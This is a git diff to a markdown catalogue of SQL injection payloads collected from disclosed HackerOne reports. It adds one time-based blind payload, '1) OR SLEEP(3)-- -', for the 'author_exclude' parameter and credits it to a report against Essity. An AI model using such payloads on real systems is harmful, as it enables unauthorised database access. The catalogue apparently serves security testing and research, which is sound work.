@@ -1,6 +1,6 @@
 # SQL Injection
 
-138 payloads from disclosed reports.
+139 payloads from disclosed reports.
 
 ## Union-based SQL injection
 
@@ -698,6 +698,14 @@ author_exclude=1) OR SLEEP(N)-- -
 ```
 
 **Parameter:** `author_exclude`
+— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `4ab510cb`
+
+```
+1) OR SLEEP(3)-- -
+```
+
 — [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)
 
 
